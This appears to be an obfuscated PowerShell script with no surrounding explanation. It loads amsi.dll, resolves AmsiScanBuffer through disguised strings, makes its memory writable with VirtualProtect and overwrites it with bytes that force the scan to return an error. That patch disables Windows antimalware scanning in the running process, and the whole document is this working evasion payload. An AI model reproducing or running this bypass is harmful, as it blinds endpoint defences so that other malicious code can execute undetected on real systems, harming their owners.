$pByRIhwzbV7Lrsdc6H5 = @"
using System;
using System.Runtime.InteropServices;
public class pByRIhwzbV7Lrsdc6H5 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr I3Ng77uxBy, string DcizA5VoVmhxGZGmqsT);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr JjFFbjgTBcEr, UIntPtr BJ7c, uint X3iCEqwQHI_sPHBfD0T, out uint oD1l3QRlH8h3T8wd1d2);
}
"@

Add-Type $pByRIhwzbV7Lrsdc6H5

$H3y9K6AiFv = [pByRIhwzbV7Lrsdc6H5]::LoadLibrary("$(('âmsí'+'.dll').NOrMaliZe([CHAR](70+57-57)+[cHaR](111)+[cHaR]([byte]0x72)+[ChaR](109+95-95)+[char]([BytE]0x44)) -replace [CHar](79+13)+[CHAR]([byTE]0x70)+[ChaR]([byte]0x7b)+[cHaR](57+20)+[CHAR](110+99-99)+[cHar]([ByTE]0x7d))")
$E2a9c_Vpk2 = [pByRIhwzbV7Lrsdc6H5]::GetProcAddress($H3y9K6AiFv, "$(('ÄmsìSc'+'ãnBûff'+'èr').nOrmALiZE([CHar](70)+[CHaR]([ByTe]0x6f)+[ChAR](114+108-108)+[CHaR]([ByTE]0x6d)+[cHAR]([BYTe]0x44)) -replace [ChAr](92*89/89)+[chAR](112*66/66)+[char]([bYTE]0x7b)+[cHAR](50+27)+[CHar]([Byte]0x6e)+[CHAr](125+4-4))")
$p = 0
[pByRIhwzbV7Lrsdc6H5]::VirtualProtect($E2a9c_Vpk2, [uint32]5, 0x40, [ref]$p)
$iZN9Nr9rkNkX = "0xB8"
$WCNBbznfLaNcKLNSUR = "0x57"
$ZP6l_XldR4vY = "0x00"
$nnYqgEQkX3dQxH6z = "0x07"
$RSMdWdWBZjSlz = "0x80"
$cwb222G7nax = "0xC3"
$VkSlbxBt8PSp = [Byte[]] ($iZN9Nr9rkNkX,$WCNBbznfLaNcKLNSUR,$ZP6l_XldR4vY,$nnYqgEQkX3dQxH6z,+$RSMdWdWBZjSlz,+$cwb222G7nax)
[System.Runtime.InteropServices.Marshal]::Copy($VkSlbxBt8PSp, 0, $E2a9c_Vpk2, 6)